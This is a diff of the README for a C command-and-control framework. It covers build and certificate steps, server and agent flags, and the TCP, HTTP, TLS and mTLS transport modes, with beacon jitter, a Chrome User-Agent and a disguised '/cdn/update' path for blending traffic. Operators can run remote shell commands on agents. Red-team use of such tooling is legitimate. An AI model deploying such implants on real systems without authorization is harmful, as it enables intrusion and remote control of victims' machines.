@@ -1,33 +1,157 @@
-# Simple C2
+# C2 Framework
 
-simple command and control (c2) server written in C
+A lightweight command and control framework written in C, supporting multiple transport modes including raw TCP, HTTP, TLS, HTTPS, and mutual TLS (mTLS).
+
+## Requirements
+
+- GCC or Clang
+- OpenSSL (`libssl-dev`) — required for TLS / mTLS / HTTPS modes
+
+```bash
+sudo apt install build-essential libssl-dev
+```
 
 ## Build
 
 ```bash
-cd server && make        # -> ./c2server
-cd agent  && make        # -> ./agent
+make ssl          # server + agent with TLS/mTLS support (recommended)
+make              # server + agent, plain TCP/HTTP only
+
+make ssl-server   # server only
+make ssl-agent    # agent only
 ```
 
-## Run
+## Certificates
 
 ```bash
-./server/c2server -s 0.0.0.0 -p 4444 -m http
-./agent/agent -s 127.0.0.1 -p 4444 -m http
+make certs              # generate CA + server + 1 agent cert
+make certs AGENTS=3     # generate CA + server + 3 agent certs
+```
+
+Output layout:
+
+```
+certs/
+├── ca/             ca.key  ca.crt
+├── server/         server.key  server.crt  ca.crt
+├── agent-1/        agent.key   agent.crt   ca.crt
+└── agent-N/
+```
+
+## Server
+
+```bash
+./build/server/c2server -s <bind> -p <port> -m <mode> [options]
+```
+
+| Flag | Alias | Description | Default |
+|------|-------|-------------|---------|
+| `-s` | | Bind address | `0.0.0.0` |
+| `-p` | | Listen port | `4444` |
+| `-m` | | Transport mode | `tcp` |
+| `--cert` | | TLS certificate | `certs/server/server.crt` |
+| `--key` | | TLS private key | `certs/server/server.key` |
+| `--ca` | | CA cert (mTLS only) | `certs/server/ca.crt` |
+| `--path` | | HTTP beacon path | `/update` |
+| `--ua` | | User-Agent to match | Chrome UA |
+| `--beacon` | | Beacon interval ms | `3000` |
+| `--jitter` | | Jitter percent | `15` |
+
+## Agent
+
+```bash
+./build/agent/agent -s <host> -p <port> -m <mode> [options]
+```
+
+| Flag | Alias | Description | Default |
+|------|-------|-------------|---------|
+| `-s` | `-host` | C2 server address | `127.0.0.1` |
+| `-p` | `-port` | C2 server port | `4444` |
+| `-m` | `-mode` | Transport mode | `tcp` |
+| `--cert` | `-cert` | Client certificate | `certs/agent-1/agent.crt` |
+| `--key` | `-key` | Client private key | `certs/agent-1/agent.key` |
+| `--ca` | `-ca` | CA cert (mTLS only) | `certs/agent-1/ca.crt` |
+| `--path` | `-path` | HTTP beacon path | `/update` |
+| `--ua` | `-ua` | User-Agent header | Chrome UA |
+| `--beacon` | `-beacon` | Beacon interval ms | `3000` |
+| `--jitter` | `-jitter` | Jitter percent | `15` |
+
+## Transport Modes
+
+| Mode | Description |
+|------|-------------|
+| `tcp` / `raw` | Plain TCP socket |
+| `http` | HTTP POST beacon |
+| `tls` | Raw TLS (server cert not verified) |
+| `https` | HTTP over TLS (server cert not verified) |
+| `mtls` | Mutual TLS — both sides verify certificates |
+
+## Examples
+
+**TCP**
+```bash
+./build/server/c2server -s 0.0.0.0 -p 4444 -m tcp
+./build/agent/agent     -s 10.0.0.1 -p 4444 -m tcp
+```
+
+**HTTP**
+```bash
+./build/server/c2server -s 0.0.0.0 -p 8080 -m http --path /cdn/update
+./build/agent/agent     -s 10.0.0.1 -p 8080 -m http --path /cdn/update
+```
+
+**TLS**
+```bash
+make certs
+./build/server/c2server -s 0.0.0.0 -p 443 -m tls \
+  --cert certs/server/server.crt \
+  --key  certs/server/server.key
+
+./build/agent/agent -s 10.0.0.1 -p 443 -m tls
+```
+
+**mTLS**
+```bash
+make certs AGENTS=2
+./build/server/c2server -s 0.0.0.0 -p 4444 -m mtls \
+  --cert certs/server/server.crt \
+  --key  certs/server/server.key \
+  --ca   certs/server/ca.crt
+
+./build/agent/agent -s 10.0.0.1 -p 4444 -m mtls \
+  --cert certs/agent-1/agent.crt \
+  --key  certs/agent-1/agent.key \
+  --ca   certs/agent-1/ca.crt
 ```
 
 ## Console Commands
 
-```txt
+```
 help              Show help
-sessions          List active agents          (alias: session)
-use 1             Enter interactive shell     (alias: interact 1)
-back              Return to main console
-kill              Kill connected agent
+sessions          List active agents
+use <id>          Enter interactive shell with agent   (alias: interact <id>)
+kill <id>         Queue kill for specific agent
+kill all          Queue kill for all agents
+info              Show server configuration
 clear             Clear screen
 exit / quit       Shutdown server
 ```
 
+**Inside a session:**
+
+```
+<command>         Execute shell command on agent
+back              Return to server console
+kill              Kill this session
+clear             Clear screen
+```
+
+## Legal
+
+For authorized security testing and red team lab use only.
+
 ---
 
-<p align="center">&copy; 2023-2026 MatrixTM26</p>
+<p align="center">
+  <a href="https://github.com/matrixtm26">@matrixtm26</a>
+</p>
